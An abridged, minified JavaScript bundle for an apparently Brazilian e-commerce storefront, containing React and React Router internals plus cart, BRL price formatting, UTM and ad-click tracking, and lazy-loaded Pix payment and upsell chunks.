const __vite__mapDeps = (i, m=__vite__mapDeps, d=(m.f || (m.f = ["assets/PixPayment-B1sq8zcX.js", "assets/useTikTokPixel-nmZ2TpmY.js", "assets/Upsell1-BTp3I7UU.js", "assets/Upsell2-6prUyr_w.js", "assets/Upsell3-DrNppMQw.js"]))) => i.map(i => d[i]);
var e = Object.create
...
var l = o((e => {
    ...
    function oe(e, r, i, a, o) {
        ...
        if (c)
            ...
            oe(o, r, i, ``, function(e) {
                return e
            })) : o != null && (E(o) && (o = te(o, i + (o.key == null || e && e.key === o.key ? `` : (`` + o.key).replace(re, `$&/`) + `/`) + c)),
            r.push(o)),
            1;
        c = 0;
        var l = a === `` ? `.` : a + `:`;
  ...
  , h = o((e => {
    ...
    var h = Object.assign
      ...
      , ie = Symbol.iterator;
    function ae(e) {
        return typeof e != `object` || !e ? null : (e = ie && e[ie] || e[`@@iterator`],
        typeof e == `function` ? e : null)
    }
...
` + e.stack
    ...
    var Mt = RegExp(`^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$`)
      ...
      , Nt = {};
    function Pt(e) {
        return ke.call(Nt, e) ? !0 : ke.call(j, e) ? !1 : Mt.test(e) ? Nt[e] = !0 : (j[e] = !0,
        !1)
    }
    function Ft(e, t, n) {
        if (Pt(t))
    ...
    function tn(e, t, n) {
        ...
        n != null) {
            ...
            for (var a in t)
                r = t[a],
                t.hasOwnProperty(a) && n[a] !== r && en(e, a, r)
        } else
            for (var o in t)
                t.hasOwnProperty(o) && en(e, o, t[o])
    }
    function nn(e) {
        if (e.indexOf(`-`) === -1)
            return !1;
            ...
            case `input`:
                ...
                n.type === `radio` && t != null) {
                    for (n = e; n.parentNode; )
                        n = n.parentNode;
                    for (n = n.querySelectorAll(`input[name="` + Gt(`` + t) + `"][type="radio"]`),
                    t = 0; t < n.length; t++) {
                        var r = n[t];
    ...
    function En(e) {
        function t(t, n, r, i, a) {
            ...
            e)
                ...
                this[o] = t ? t(i) : i[o]);
            return this.isDefaultPrevented = (i.defaultPrevented == null ? !1 === i.returnValue : i.defaultPrevented) ? wn : Tn,
    ...
    var Dn = {
        ...
        movementX: function(e) {
            return `movementX`in e ? e.movementX : (e !== Nn && (Nn && e.type === `mousemove` ? (jn = e.screenX - Nn.screenX,
            Mn = e.screenY - Nn.screenY) : Mn = jn = 0,
            Nn = e),
            jn)
        },
    ...
    var Kn = En(h({}, kn, {
        key: function(e) {
            ...
            return e.type === `keypress` ? (e = Cn(e),
            e === 13 ? `Enter` : String.fromCharCode(e)) : e.type === `keydown` || e.type === `keyup` ? Hn[e.keyCode] || `Unidentified` : ``
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
      ...
      , Qn = [9, 13, 27, 32]
      , M = gn && `CompositionEvent`in window
      , $n = null;
    ...
    function cr(e, t) {
        if (or)
            return e === `compositionend` || !M && ir(e, t) ? (e = Sn(),
            xn = bn = yn = null,
            or = !1,
            e) : null;
        switch (e) {
    ...
    function dr(e, t, n, r) {
        ...
        t = Ed(t, `onChange`),
        0 < t.length && (n = new On(`onChange`,`change`,null,n,r),
        e.push({
            event: n,
            listeners: t
        }))
    ...
    function Br(e, t, n) {
        ...
        Rr && kr(Rr, r) || (Rr = r,
        r = Ed(Lr, `onSelect`),
        0 < r.length && (t = new On(`onSelect`,`select`,null,t,n),
        e.push({
            event: t,
            listeners: r
        }),
    ...
    var Hr = {
      ...
      , Ur = {}
      , Wr = {};
    gn && (Wr = document.createElement(`div`).style,
    ...
    function Wi(e) {
        ...
        case `textarea`:
            Q(`invalid`, t),
            Zt(t, r.value, r.defaultValue, r.children)
        }
        n = r.children,
    ...
    function Ki(e) {
        ...
        t === 13) {
            ...
            Zd(e.type) ? (e = lf,
            lf = null,
            N = e) : N = t) : N = zi ? cf(e.stateNode.nextSibling) : null;
        return !0
    }
    function qi() {
        N = zi = null,
    ...
    function ja(e, t, n) {
        switch (n = e[n],
        n === void 0 ? e.push(t) : n !== t && (t.then(sn, sn),
        t = n),
        t.status) {
        case `fulfilled`:
            return t.value;
    ...
    function Va(e) {
        ...
        function l(e, t, n, r) {
            var i = n.type;
            return i === y ? d(e, t, n.props.children, r, n.key) : t !== null && (t.elementType === i || typeof i == `object` && i && i.$$typeof === E && Ma(i) === t.type) ? (t = a(t, n.props),
            za(t, n),
            t.return = e,
    ...
    function Oo() {
        var e = D.H
          , t = e.useState()[0];
        return t = typeof t.then == `function` ? Po(t) : t,
        e = e.useState()[0],
    ...
    function Mo() {
        ...
        return z === null ? L.memoizedState = z = e : z = z.next = e,
        z
    }
    function V() {
        if (R === null) {
    ...
    function Po(e) {
        ...
        e = ja(So, e, t),
        t = L,
        (z === null ? t.memoizedState : z.next) === null && (t = t.alternate,
    ...
    function us(e, t, n, r) {
        ...
        R !== null && r !== null && wo(r, R.memoizedState.deps) ? i.memoizedState = ss(t, a, n, r) : (L.flags |= e,
        i.memoizedState = ss(1 | t, a, n, r))
    }
    function ds(e, t) {
        ls(8390656, 8, e, t)
    }
    ...
    function bs(e, t) {
        ...
        return t !== null && wo(t, r[1]) ? r[0] : (n.memoizedState = [e, t],
        e)
    }
    function xs(e, t) {
        var n = V();
    ...
    function Ss(e, t, n) {
        return n === void 0 || go & 1073741824 && !(J & 261930) ? e.memoizedState = t : (e.memoizedState = n,
        e = mu(),
        L.lanes |= e,
        Gl |= e,
        n)
    ...
    function Cs(e, t, n, r) {
        return Or(n, t) ? n : no.current === null ? !(go & 42) || go & 1073741824 && !(J & 261930) ? (H = !0,
    ...
    function ws(e, t, n, r, i) {
        ...
        try {
            var c = i()
              , l = D.S;
            l !== null && l(s, c),
            typeof c == `object` && c && typeof c.then == `function` ? Fs(e, t, ba(c, r), pu(e)) : Fs(e, t, r, pu(e))
        } catch (n) {
            Fs(e, t, {
                then: function() {},
                status: `rejected`,
    ...
    var Vs = {
        ...
        useCallback: function(e, t) {
            return Mo().memoizedState = [e, t === void 0 ? null : t],
            e
        },
        useContext: oa,
        useEffect: ds,
        ...
        useTransition: function() {
            var e = qo(!1);
            return e = ws.bind(null, L, e.queue, !0, !1),
            Mo().memoizedState = e,
            [!1, e]
        },
    ...
    function rc(e, t, n, r, a) {
        ...
        typeof r == `object` && r && typeof r.then == `function`) {
            ...
            n !== null) {
                ...
                case 31:
                case 13:
                    return co === null ? Du() : n.alternate === null && X === 0 && (X = 3),
                    n.flags &= -257,
                    n.flags |= 65536,
                    n.lanes = a,
    ...
    function sc(e, t, n, r, i) {
        if (e === null) {
            ...
            t.type = a,
            cc(e, t, a, r, i)) : (e = vi(n.type, null, r, t, t.mode, i),
            e.ref = t.ref,
            e.return = t,
            t.child = e)
        }
    ...
    function vc(e, t, n, r, i) {
        ...
        t.stateNode === null) {
            ...
            s = t.pendingProps !== s,
            u || typeof a.UNSAFE_componentWillReceiveProps != `function` && typeof a.componentWillReceiveProps != `function` || (s || l !== o) && qs(t, a, r, o),
            Wa = !1;
            ...
            Qa(),
            l = t.memoizedState,
            s || f !== l || Wa ? (typeof d == `function` && (Ws(t, n, d, r),
            l = t.memoizedState),
            (c = Wa || Ks(t, n, c, r, f, l, o)) ? (u || typeof a.UNSAFE_componentWillMount != `function` && typeof a.componentWillMount != `function` || (typeof a.componentWillMount == `function` && a.componentWillMount(),
            typeof a.UNSAFE_componentWillMount == `function` && a.UNSAFE_componentWillMount()),
            ...
            (l = typeof s == `function` || typeof a.getSnapshotBeforeUpdate == `function`) || typeof a.UNSAFE_componentWillReceiveProps != `function` && typeof a.componentWillReceiveProps != `function` || (o !== d || f !== c) && qs(t, a, r, c),
            Wa = !1,
            f = t.memoizedState,
            a.state = f,
            $a(t, r, a, i),
            ...
            o !== d || f !== p || Wa || e !== null && e.dependencies !== null && ia(e.dependencies) ? (typeof s == `function` && (Ws(t, n, s, r),
            p = t.memoizedState),
            (u = Wa || Ks(t, n, u, r, f, p, c) || e !== null && e.dependencies !== null && ia(e.dependencies)) ? (l || typeof a.UNSAFE_componentWillUpdate != `function` && typeof a.componentWillUpdate != `function` || (typeof a.componentWillUpdate == `function` && a.componentWillUpdate(r, p, c),
        ...
        t.child = Ha(t, null, n, i)) : ac(e, t, n, i),
    ...
    function Cc(e, t, n) {
        ...
        if ((s = o) || (s = e !== null && e.memoizedState === null ? !1 : (I.current & 2) != 0),
        s && (a = !0,
        t.flags &= -129),
        s = (t.flags & 32) != 0,
        t.flags &= -33,
        ...
        c === null ? c = xc(n) : (a = c.cachePool,
        a === null ? a = Ta() : (l = F._currentValue,
        a = a.parent === l ? a : {
            parent: l,
            pool: l
        }),
    ...
    function Nc(e, t, n) {
        ...
        case 26:
            return hc(e, t),
            e === null ? (n = kf(t.type, null, t.pendingProps, null)) ? t.memoizedState = n : P || (n = t.type,
            e = t.pendingProps,
        ...
        case 27:
            return be(t),
            e === null && P && (r = t.stateNode = ff(t.type, t.pendingProps, ge.current),
            zi = t,
            Vi = !0,
            a = N,
            Zd(t.type) ? (lf = a,
            N = cf(r.firstChild)) : N = a),
            ac(e, t, t.pendingProps.children, n),
            hc(e, t),
            e === null && (t.flags |= 4194304),
            t.child;
        case 5:
            return e === null && P && ((a = r = N) && (r = tf(r, t.type, t.pendingProps, Vi),
            ...
            t.memoizedState !== null && (a = To(e, t, Oo, null, null, n),
            Qf._currentValue = a),
            hc(e, t),
            ac(e, t, r, n),
            t.child;
        case 6:
            return e === null && P && ((e = n = N) && (n = nf(n, t.pendingProps, Vi),
        ...
        case 7:
            return ac(e, t, t.pendingProps, n),
            t.child;
        case 8:
            return ac(e, t, t.pendingProps.children, n),
            t.child;
        case 12:
            return ac(e, t, t.pendingProps.children, n),
            t.child;
    ...
    function zc(e, t, n) {
        ...
        case 3:
            ...
            null),
            (e === null || e.child === null) && (Ki(t) ? Pc(t) : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024,
            Ji())),
            U(t),
            null;
        case 26:
            ...
            o === null ? (U(t),
            Fc(t, a, null, r, n)) : (U(t),
            Ic(t, o))) : o ? o === e.memoizedState ? (U(t),
            t.flags &= -16777217) : (Pc(t),
            U(t),
            Ic(t, o)) : (e = e.memoizedProps,
            e !== r && Pc(t),
            U(t),
            Fc(t, a, e, r, n)),
            null;
    ...
    function Gc(e, t, n) {
        n.props = Js(e.type, e.memoizedProps),
    ...
    function sl(e, t, n) {
        ...
        case 22:
            ...
            !r) {
                t = t !== null && t.memoizedState !== null || nl,
                i = tl;
                var a = nl;
                tl = r,
    ...
    function vl(e, t) {
        ...
        case 26:
            ...
            r & 4) {
                ...
                n === null)
                        ...
                        if (e.stateNode === null) {
                            a: {
                                ...
                                case `title`:
                                    ...
                                    (!o || o[xt] || o[mt] || o.namespaceURI === `http://www.w3.org/2000/svg` || o.hasAttribute(`itemprop`)) && (o = a.createElement(r),
                    ...
                    o === r ? r === null && e.stateNode !== null && Yc(e, e.memoizedProps, n.memoizedProps) : (o === null ? n.stateNode !== null && (n = n.stateNode,
        ...
        case 5:
            ...
            Yc(e, a, n === null ? a : n.memoizedProps)),
            r & 1024 && (rl = !0);
            break;
        case 6:
            if (gl(t, e),
    ...
    function Pu(e, t, n, r) {
        ...
        t.flags & 32768 ? (P || r === 1 ? e = !0 : Hl || J & 536870912 ? e = !1 : (Vl = e = !0,
                ...
                for (var n = !1, r = Zu; r !== null; ) {
                    if (!t)
                        if (e !== 0) {
                            ...
                            a = J,
                            a = $e(r, r === K ? a : 0, r.cancelPendingCommit !== null || r.timeoutHandle !== -1),
                            !(a & 3) || et(r, a) || (n = !0,
                            ld(r, a));
                    r = r.next
                }
    ...
    function cd(e, t) {
        ...
        if (Hu() && e.callbackNode !== n)
            return null;
        var r = J;
        return r = $e(e, e === K ? r : 0, e.cancelPendingCommit !== null || e.timeoutHandle !== -1),
        r === 0 ? null : (gu(e, r, t),
        sd(e, Pe()),
            ...
            a: {
                ...
                if (c !== void 0) {
                    ...
                    for (var m = r, h; m !== null; ) {
                        ...
                        if (h = g.stateNode,
                        g = g.tag,
                        g !== 5 && g !== 26 && g !== 27 || h === null || p === null || (g = hn(m, p),
            ...
            if (!(t & 7)) {
                a: {
                    ...
                    l !== u)) {
                        ...
                        p = `onMouseEnter`,
                        m = `mouse`,
                        (e === `pointerout` || e === `pointerover`) && (d = qn,
                        g = `onPointerLeave`,
                        p = `onPointerEnter`,
                        m = `pointer`),
                        f = l == null ? c : Tt(l),
                ...
                a: {
                    ...
                    l === `select` || l === `input` && c.type === `file`)
                        ...
                        l = c.nodeName,
                        !l || l.toLowerCase() !== `input` || c.type !== `checkbox` && c.type !== `radio` ? r && nn(r.elementType) && (v = gr) : v = Tr;
                    if (v &&= v(e, r)) {
                        dr(s, v, n, i);
                        break a
                    }
                ...
                x && (tr && n.locale !== `ko` && (or || x !== `onCompositionStart` ? x === `onCompositionEnd` && or && (b = Sn()) : (yn = i,
                bn = `value`in yn ? yn.value : yn.textContent,
                or = !0)),
                y = Ed(r, x),
                0 < y.length && (x = new Bn(x,e,null,n,i),
                s.push({
                    event: x,
                    listeners: y
                }),
                b ? x.data = b : (b = ar(n),
                b !== null && (x.data = b)))),
                (b = er ? sr(e, n) : cr(e, n)) && (x = Ed(r, `onBeforeInput`),
                0 < x.length && (y = new Bn(`onBeforeInput`,`beforeinput`,null,n,i),
                s.push({
                    event: y,
                    listeners: x
                }),
    ...
    function Od(e, t, n, r, i) {
        for (var a = t._reactName, o = []; n !== null && n !== r; ) {
            ...
            i ? (l = hn(n, a),
            l != null && o.unshift(Td(n, l, c))) : i || (l = hn(n, a),
...
`).replace(Ad, ``)
    ...
    function $(e, t, n, r, a, o) {
        ...
        case `textContent`:
            break;
        default:
            (!(2 < n.length) || n[0] !== `o` && n[0] !== `O` || n[1] !== `n` && n[1] !== `N`) && (n = rn.get(n) || n,
            Ft(e, n, r))
        }
    }
    ...
    function Fd(e, t, n, r) {
        ...
        case `select`:
            ...
            n = s,
            r = m,
            p == null ? !!r != !!n && (t == null ? Yt(e, !!n, n ? [] : ``, !1) : Yt(e, !!n, t, !0)) : Yt(e, !!n, p, !1);
            return;
        case `textarea`:
            for (c in m = p = null,
            n)
    ...
    function wf(e, t, n) {
        ...
        if (r && e && t) {
            ...
            t === `image` && n && n.imageSrcSet ? (i += `[imagesrcset="` + Gt(n.imageSrcSet) + `"]`,
            typeof n.imageSizes == `string` && (i += `[imagesizes="` + Gt(n.imageSizes) + `"]`)) : i += `[href="` + Gt(e) + `"]`;
            var a = i;
            switch (t) {
            case `style`:
                a = Af(e);
...
function se(e, t, n, r) {
    let i = Se((typeof t == `string` ? re(t) : t).pathname || `/`, n);
    if (i == null)
        return null;
    let a = D(e);
    le(a);
    ...
    let a = (e, a, o=i, s) => {
        ...
        if (c.relativePath.startsWith(`/`)) {
            if (!c.relativePath.startsWith(r) && o)
                return;
            w(c.relativePath.startsWith(r), `Absolute route path "${c.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),
            c.relativePath = c.relativePath.slice(r.length)
        }
        let l = Ae([r, c.relativePath])
          , u = n.concat(c);
        e.children && e.children.length > 0 && (w(e.index !== !0, `Index routes must not have child routes. Please remove all child routes from route path "${l}".`),
...
function ge(e, t) {
    let n = e.split(`/`)
      , r = n.length;
    return n.some(he) && (r += me),
    t && (r += fe),
    n.filter(e => !he(e)).reduce( (e, t) => e + (ue.test(t) ? de : t === `` ? pe : k), r)
}
function _e(e, t) {
...
function ve(e, t, n=!1) {
    ...
    for (let e = 0; e < r.length; ++e) {
        let s = r[e]
          ...
          , d = s.route;
        if (!u && c && n && !r[r.length - 1].route.index && (u = ye({
            path: s.relativePath,
            caseSensitive: s.caseSensitive,
            end: !1
        }, l)),
...
function xe(e) {
    try {
        ...
        return T(!1, `The URL path "${e}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${t}).`),
        e
    }
}
function Se(e, t) {
...
var Ce = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;
function we(e, t=`/`) {
    let {pathname: n, search: r=``, hash: i=``} = typeof e == `string` ? re(e) : e, a;
...
function ke(e, t, n, r=!1) {
    let i;
    typeof e == `string` ? i = re(e) : (i = {
        ...e
    },
    w(!i.pathname || !i.pathname.includes(`?`), Ee(`?`, `pathname`, `search`, i)),
    w(!i.pathname || !i.pathname.includes(`#`), Ee(`#`, `pathname`, `hash`, i)),
    w(!i.search || !i.search.includes(`#`), Ee(`#`, `search`, `hash`, i)));
...
var Ve = _.createContext(!1)
  , He = _.createContext({
    isTransitioning: !1
});
He.displayName = `ViewTransition`;
var Ue = _.createContext(new Map);
Ue.displayName = `Fetchers`;
var We = _.createContext(null);
...
function et() {
    return _.useContext(Ge) != null
}
function tt() {
    return w(et(), `useLocation() may be used only in the context of a <Router> component.`),
    _.useContext(Ge).location
}
...
function at() {
    ...
    _.useCallback( (r, s={}) => {
        ...
        e == null && t !== `/` && (c.pathname = c.pathname === `/` ? t : Ae([t, c.pathname])),
...
function st(e) {
    let t = _.useContext(Ke).outlet;
    return _.useMemo( () => t && _.createElement(ot.Provider, {
        value: e
    }, t), [t, e])
}
function ct() {
    let {matches: e} = _.useContext(Ke)
      , t = e[e.length - 1];
    return t ? t.params : {}
}
function lt(e, {relative: t}={}) {
    let {matches: n} = _.useContext(Ke)
      , {pathname: r} = tt()
      , i = JSON.stringify(Oe(n));
    return _.useMemo( () => ke(e, JSON.parse(i), r, t === `path`), [e, i, r, t])
}
function ut(e, t) {
    return dt(e, t)
}
function dt(e, t, n, r, i) {
    ...
    let {navigator: a} = _.useContext(A)
      , {matches: o} = _.useContext(Ke)
      , s = o[o.length - 1]
      , c = s ? s.params : {}
      , l = s ? s.pathname : `/`
      , u = s ? s.pathnameBase : `/`
    ...
    {
        let e = d && d.path || ``;
        At(l, !d || e.endsWith(`*`) || e.endsWith(`*?`), `You rendered descendant <Routes> (or called \`useRoutes()\`) at "${l}" (under <Route path="${e}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.
...
Please change the parent <Route path="${e}"> to <Route path="${e === `/` ? `*` : `${e}/*`}">.`)
    ...
    T(g == null || g[g.length - 1].route.element !== void 0 || g[g.length - 1].route.Component !== void 0 || g[g.length - 1].route.lazy !== void 0, `Matched leaf route at location "${p.pathname}${p.search}${p.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);
    let v = vt(g && g.map(e => Object.assign({}, e, {
    ...
    return t && v ? _.createElement(Ge.Provider, {
        value: {
            location: {
                pathname: `/`,
                search: ``,
...
function ft() {
    ...
    o = _.createElement(_.Fragment, null, _.createElement(`p`, null, `💿 Hey developer 👋`), _.createElement(`p`, null, `You can provide a way better UX than this when your app throws errors by providing your own `, _.createElement(`code`, {
        style: a
...
var pt = _.createElement(ft, null)
  , mt = class extends _.Component {
    constructor(e) {
        super(e),
        this.state = {
            location: e.location,
    ...
    render() {
        ...
        let t = e === void 0 ? this.props.children : _.createElement(Ke.Provider, {
            value: this.props.routeContext
        }, _.createElement(qe.Provider, {
            value: e,
            children: this.props.component
        }));
        return this.context ? _.createElement(gt, {
            error: e
        }, t) : t
    }
}
...
function vt(e, t=[], n=null, r=null, i=null) {
    ...
    if (o != null) {
        ...
        w(e >= 0, `Could not find a matching route for errors on route IDs: ${Object.keys(o).join(`,`)}`),
    ...
    return a.reduceRight( (e, r, i) => {
        ...
        n && (u = o && r.route.id ? o[r.route.id] : void 0,
        f = r.route.errorElement || pt,
        s && (c < 0 && i === 0 ? (At(`route-fallback`, !1, "No `HydrateFallback` element provided to render during initial hydration"),
        d = !0,
        p = null) : c === i && (d = !0,
        ...
        let m = t.concat(a.slice(0, i + 1))
          , h = () => {
            let t;
            return t = u ? f : d ? p : r.route.Component ? _.createElement(r.route.Component, null) : r.route.element ? r.route.element : e,
            _.createElement(_t, {
                match: r,
                routeContext: {
                    outlet: e,
        ...
        ;
        return n && (r.route.ErrorBoundary || r.route.errorElement || i === 0) ? _.createElement(mt, {
            location: n.location,
...
function Ct(e) {
    ...
    return w(n.route.id, `${e} can only be used on routes that contain a unique "id"`),
    n.route.id
}
function wt() {
...
function Nt({basename: e=`/`, children: t=null, location: n, navigationType: r=`POP`, navigator: i, static: a=!1, unstable_useTransitions: o}) {
    ...
    , [s, l, u, d, f, p, r]);
    return T(m != null, `<Router basename="${s}"> is not able to match the URL "${l}${u}${d}" because it does not start with the basename, so the <Router> won't render anything.`),
    m == null ? null : _.createElement(A.Provider, {
        value: c
    }, _.createElement(Ge.Provider, {
        children: t,
        value: m
    }))
}
...
function Ft(e, t=[]) {
    ...
    return _.Children.forEach(e, (e, r) => {
        ...
        w(e.type === j, `[${typeof e.type == `string` ? e.type : e.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),
        ...
        e.props.children && (a.children = Ft(e.props.children, i)),
        n.push(a)
    }
    ),
    n
...
function Yt(e) {
    return e != null && !Jt.has(e) ? (T(!1, `"${e}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Lt}"`),
    null) : e
}
function Xt(e, t) {
    let n, r, i, a, o;
    if (Bt(e)) {
        ...
        i = Yt(e.getAttribute(`formenctype`)) || Yt(o.getAttribute(`enctype`)) || Lt,
        a = new FormData(o,e),
        !qt()) {
...
function tn(e, t, n, r) {
    ...
    return n ? i.pathname.endsWith(`/`) ? i.pathname = `${i.pathname}_.${r}` : i.pathname = `${i.pathname}.${r}` : i.pathname === `/` ? i.pathname = `_root.${r}` : t && Se(i.pathname, t) === `/` ? i.pathname = `${t.replace(/\/$/, ``)}/_root.${r}` : i.pathname = `${i.pathname.replace(/\/$/, ``)}.${r}`,
    i
}
...
async function on(e, t, n) {
    return dn((await Promise.all(e.map(async e => {
    ...
    ))).flat(1).filter(an).filter(e => e.rel === `stylesheet` || e.rel === `preload`).map(e => e.rel === `stylesheet` ? {
        ...e,
        rel: `prefetch`,
        as: `style`
    } : {
...
function dn(e, t) {
    let n = new Set
      , r = new Set(t);
    return e.reduce( (e, i) => {
        if (t && !rn(i) && i.as === `script` && i.href && r.has(i.href))
            return e;
...
function fn() {
    let e = _.useContext(ze);
    return en(e, `You must render this element inside a <DataRouterContext.Provider> element`),
    e
}
function pn() {
    let e = _.useContext(Be);
    return en(e, `You must render this element inside a <DataRouterStateContext.Provider> element`),
    e
}
var mn = _.createContext(void 0);
mn.displayName = `FrameworkContext`;
function hn() {
    let e = _.useContext(mn);
    return en(e, `You must render this element inside a <HydratedRouter> element`),
    e
}
function gn(e, t) {
    let n = _.useContext(mn)
      , [r,i] = _.useState(!1)
      , [a,o] = _.useState(!1)
...
function bn({page: e, matches: t, ...n}) {
    let r = tt()
      ...
      , u = _.useMemo( () => sn(e, t, l, a, r, `data`), [e, t, l, a, r])
      , d = _.useMemo( () => sn(e, t, l, a, r, `assets`), [e, t, l, a, r])
      , f = _.useMemo( () => {
    ...
    , [s, i.unstable_trailingSlashAwareDataRequests, c, r, a, u, t, e, o])
      , p = _.useMemo( () => cn(d, a), [d, a])
      , m = yn(d);
    return _.createElement(_.Fragment, null, f.map(e => _.createElement(`link`, {
        key: e,
        rel: `prefetch`,
        as: `fetch`,
        href: e,
        ...n
    })), p.map(e => _.createElement(`link`, {
        key: e,
        rel: `modulepreload`,
        href: e,
        ...n
    })), m.map( ({key: e, link: t}) => _.createElement(`link`, {
        key: e,
        nonce: n.nonce,
        ...t,
...
try {
    Sn && (window.__reactRouterVersion = `7.13.0`)
} catch {}
...
function wn({basename: e, children: t, history: n, unstable_useTransitions: r}) {
    let[i,a] = _.useState({
        action: n.action,
        location: n.location
    })
    ...
    , [r]);
    return _.useLayoutEffect( () => n.listen(o), [n, o]),
    _.createElement(Nt, {
        basename: e,
        children: t,
        location: i.location,
...
var Tn = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , En = _.forwardRef(function({onClick: e, discover: t=`render`, prefetch: n=`none`, relative: r, reloadDocument: i, replace: a, state: o, target: s, to: c, preventScrollReset: l, viewTransition: u, unstable_defaultShouldRevalidate: d, ...f}, p) {
    let {basename: m, unstable_useTransitions: h} = _.useContext(A)
    ...
    return b && !g ? _.createElement(_.Fragment, null, T, _.createElement(vn, {
        page: y
    })) : T
});
En.displayName = `Link`;
var Dn = _.forwardRef(function({"aria-current": e=`page`, caseSensitive: t=!1, className: n=``, end: r=!1, style: i, to: a, viewTransition: o, children: s, ...c}, l) {
    let u = lt(a, {
        relative: c.relative
    })
      , d = tt()
...
var On = _.forwardRef( ({discover: e=`render`, fetcherKey: t, navigate: n, reloadDocument: r, replace: i, state: a, method: o=It, action: s, onSubmit: c, relative: l, preventScrollReset: u, viewTransition: d, unstable_defaultShouldRevalidate: f, ...p}, m) => {
    let {unstable_useTransitions: h} = _.useContext(A)
      , g = Ln()
      , v = Rn(s, {
        relative: l
    })
      , y = o.toLowerCase() === `get` ? `get` : `post`
      , b = typeof s == `string` && Tn.test(s);
...
function Nn(e, {target: t, replace: n, state: r, preventScrollReset: i, relative: a, viewTransition: o, unstable_defaultShouldRevalidate: s, unstable_useTransitions: c}={}) {
    let l = it()
      , u = tt()
      , d = lt(e, {
        relative: a
...
function Pn(e) {
    ...
    let t = _.useRef(Wt(e))
      , n = _.useRef(!1)
      , r = tt()
      , i = _.useMemo( () => Gt(r.search, n.current ? null : t.current), [r.search])
      , a = it();
    return [i, _.useCallback( (e, t) => {
...
function Ln() {
    ...
    return _.useCallback(async (e, a={}) => {
        ...
        a.navigate === !1 ? await r(a.fetcherKey || In(), n, a.action || o, {
...
function Vn(e, t, n, r) {
    ...
    return r && (i = r(n === `/` ? e : {
        ...e,
        pathname: Se(e.pathname, n) || e.pathname
    }, t)),
    i ??= e.key,
    i
}
function Hn({getKey: e, storageKey: t}={}) {
    let {router: n} = jn(`useScrollRestoration`)
      , {restoreScrollPosition: r, preventScrollReset: i} = Mn(`useScrollRestoration`)
      , {basename: a} = _.useContext(A)
      , o = tt()
      , s = Et()
      , c = Tt();
    _.useEffect( () => (window.history.scrollRestoration = `manual`,
    () => {
    ...
    , [c.state, e, a, o, s, t])),
    typeof document < `u` && (_.useLayoutEffect( () => {
        try {
    ...
    , [t]),
    _.useLayoutEffect( () => {
        let t = n?.enableScrollRestoration(Bn, () => window.scrollY, e ? (t, n) => Vn(t, n, a, e) : void 0);
        return () => t && t()
    }
    , [n, a, e]),
    _.useLayoutEffect( () => {
...
function Gn(e) {
    return e == null ? `` : e.toLocaleString(`pt-BR`, {
        style: `currency`,
        currency: `BRL`
    })
}
function Kn(e) {
    ...
    return {
        currency: `R$`,
        integer: parseInt(t).toLocaleString(`pt-BR`),
        decimal: n
    }
}
function qn(e, t) {
    return !t || t <= e ? 0 : Math.round((t - e) / t * 100)
}
function Jn(e) {
    return e ? e >= 1e3 ? `${(e / 1e3).toFixed(1).replace(`.0`, ``)}mil` : e.toString() : `0`
}
function Yn(e) {
    if (!e)
        return ``;
    let t = Array.isArray(e) ? e : [e]
      , n = e => /\.(mp4|webm|mov|avi)$/i.test(e) || /vod\.susercontent\.com/i.test(e);
    return t.find(e => e && !n(e)) || t[0] || ``
}
function Xn(e) {
    if (!e)
        return [];
...
function rr({children: e}) {
    ...
    _.useEffect)( () => {
        let e = e => {
            e.key === er && n(e.newValue ? JSON.parse(e.newValue) : [])
        }
        ;
    ...
    , []);
    let r = (0,
    _.useCallback)( (e, t=1, r=null) => {
        let i = isNaN(t) || t < 1 ? 1 : t
          , a = Number(e.preco) || 0
          , o = Number(e.preco_antigo) || a;
        n(t => {
            let n = `${e.id}-${r || `default`}`;
            return t.find(e => e.key === n) ? t.map(e => e.key === n ? {
                ...e,
                quantidade: (e.quantidade || 0) + i
            } : e) : [...t, {
                key: n,
                id: e.id,
                nome: e.nome,
    ...
    , [])
      , u = (0,
    _.useMemo)( () => {
        let e = t.reduce( (e, t) => e + (Number(t.quantidade) || 1), 0)
          , n = t.filter(e => e.selecionado)
          , r = n.reduce( (e, t) => e + (Number(t.preco) || 0) * (Number(t.quantidade) || 1), 0)
          , i = n.reduce( (e, t) => e + (Number(t.preco_antigo) || Number(t.preco) || 0) * (Number(t.quantidade) || 1), 0);
        return {
            totalItems: e,
            selectedItems: n,
            totalPrice: r,
...
function or({children: e}) {
    ...
    _.useEffect)( () => {
        let e = new URLSearchParams(r.search)
          , t = {};
        [`utm_source`, `utm_medium`, `utm_campaign`, `utm_content`, `utm_term`, `ttclid`, `fbclid`, `gclid`, `sck`].forEach(n => {
            let r = e.get(n);
            r && (t[n] = r)
        }
        ),
...
function cr() {
    ...
    return (0,
    _.useCallback)( (n, r) => {
        if (typeof n == `string` && Object.keys(t).length > 0) {
            let[i,a] = n.split(`#`)
              , [o,s] = i.split(`?`)
    ...
    return new Promise( (n, r) => {
        ...
        i.onload = function() {
            i.status >= 200 && i.status < 400 ? n({
                ...
                ,
                text: () => Promise.resolve(i.responseText)
            }) : n({
                ok: !1,
                status: i.status,
                json: () => Promise.reject(Error(`HTTP ` + i.status)),
                text: () => Promise.resolve(i.responseText)
            })
        }
        ,
        i.onerror = () => r(Error(`XHR network error`)),
